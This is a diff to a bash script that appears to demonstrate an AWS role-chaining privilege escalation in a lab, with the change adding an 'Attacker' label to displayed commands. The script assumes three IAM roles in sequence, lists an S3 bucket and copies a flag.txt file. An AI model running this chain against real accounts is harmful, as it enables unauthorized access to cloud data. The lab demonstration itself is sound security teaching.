@@ -21,12 +21,14 @@ ATTACK_COMMANDS=()
 
 # Display a command before executing it
 show_cmd() {
-    echo -e "${DIM}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "${DIM}[${identity}] \$ $*${NC}"
 }
 
 # Display AND record an attack command
 show_attack_cmd() {
-    echo -e "\n${CYAN}\$ $*${NC}"
+    local identity="$1"; shift
+    echo -e "\n${CYAN}[${identity}] \$ $*${NC}"
     ATTACK_COMMANDS+=("$*")
 }
 
@@ -85,7 +87,7 @@ echo ""
 echo "🔄 Step 1: Assuming initial role..."
 echo "Role ARN: $INITIAL_ROLE_ARN"
 
-show_attack_cmd aws sts assume-role --role-arn $INITIAL_ROLE_ARN --role-session-name "attack-initial-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
+show_attack_cmd "Attacker" "aws sts assume-role --role-arn $INITIAL_ROLE_ARN --role-session-name "attack-initial-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
 INITIAL_CREDENTIALS=$(aws sts assume-role \
     --role-arn $INITIAL_ROLE_ARN \
     --role-session-name "attack-initial-role" \
@@ -103,7 +105,7 @@ echo ""
 echo "🔄 Step 2: Assuming intermediate role..."
 echo "Role ARN: $INTERMEDIATE_ROLE_ARN"
 
-show_attack_cmd AWS_ACCESS_KEY_ID=\$INITIAL_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INITIAL_SECRET_KEY AWS_SESSION_TOKEN=\$INITIAL_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name "attack-intermediate-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INITIAL_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INITIAL_SECRET_KEY AWS_SESSION_TOKEN=\$INITIAL_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $INTERMEDIATE_ROLE_ARN --role-session-name "attack-intermediate-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
 INTERMEDIATE_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INITIAL_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$INITIAL_SECRET_KEY \
     AWS_SESSION_TOKEN=$INITIAL_SESSION_TOKEN \
@@ -125,7 +127,7 @@ echo ""
 echo "🔄 Step 3: Assuming S3 access role..."
 echo "Role ARN: $S3_ACCESS_ROLE_ARN"
 
-show_attack_cmd AWS_ACCESS_KEY_ID=\$INTERMEDIATE_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INTERMEDIATE_SECRET_KEY AWS_SESSION_TOKEN=\$INTERMEDIATE_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $S3_ACCESS_ROLE_ARN --role-session-name "attack-s3-access-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$INTERMEDIATE_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$INTERMEDIATE_SECRET_KEY AWS_SESSION_TOKEN=\$INTERMEDIATE_SESSION_TOKEN aws sts assume-role --region $REGION --role-arn $S3_ACCESS_ROLE_ARN --role-session-name "attack-s3-access-role" --query 'Credentials.[AccessKeyId,SecretAccessKey,SessionToken]' --output text"
 S3_CREDENTIALS=$(AWS_ACCESS_KEY_ID=$INTERMEDIATE_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$INTERMEDIATE_SECRET_KEY \
     AWS_SESSION_TOKEN=$INTERMEDIATE_SESSION_TOKEN \
@@ -147,7 +149,7 @@ echo ""
 # Get the actual bucket name by listing S3 buckets and finding the one with our prefix
 echo "🔄 Step 4: Listing contents of S3 bucket: $S3_BUCKET_NAME"
 
-show_attack_cmd AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 ls s3://$S3_BUCKET_NAME --region $REGION
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 ls s3://$S3_BUCKET_NAME --region $REGION"
 AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
@@ -157,7 +159,7 @@ AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
 echo ""
 echo "🔄 Step 5: Downloading and displaying flag.txt..."
 
-show_attack_cmd AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt /tmp/flag.txt --region $REGION
+show_attack_cmd "Attacker" "AWS_ACCESS_KEY_ID=\$S3_ACCESS_KEY AWS_SECRET_ACCESS_KEY=\$S3_SECRET_KEY AWS_SESSION_TOKEN=\$S3_SESSION_TOKEN aws s3 cp s3://$S3_BUCKET_NAME/flag.txt /tmp/flag.txt --region $REGION"
 AWS_ACCESS_KEY_ID=$S3_ACCESS_KEY \
     AWS_SECRET_ACCESS_KEY=$S3_SECRET_KEY \
     AWS_SESSION_TOKEN=$S3_SESSION_TOKEN \
